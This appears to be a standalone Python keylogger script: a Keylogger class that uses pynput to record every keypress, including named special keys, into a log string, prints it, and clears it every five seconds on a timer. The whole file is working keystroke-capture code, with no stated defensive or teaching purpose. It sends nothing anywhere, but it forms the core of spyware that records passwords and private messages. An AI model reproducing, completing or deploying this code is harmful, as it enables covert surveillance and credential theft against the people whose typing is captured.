#!/usr/bin/env python3

import pynput.keyboard
import threading

log= ""

class Keylogger:
    def __init__(self):
        self.log = ""
    def pressed_key(self,key):
        try:
            self.log +=  str(key.char)
        except AttributeError:
            special_keys = { key.space: "" ,key.backspace: " Backspace " , key.enter: " Enter " , key.shift: " shift " , key.ctrl: " ctrl ", key.alt: " alt " }
            self.log += special_keys.get(key, f" {str(key)}")
        print(self.log)
    
    def report(self):
        self.log = ""
        timer = threading.Timer(5, self.report )
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) 
        with keyboard_listener:
            self.report()
            keyboard_listener.join()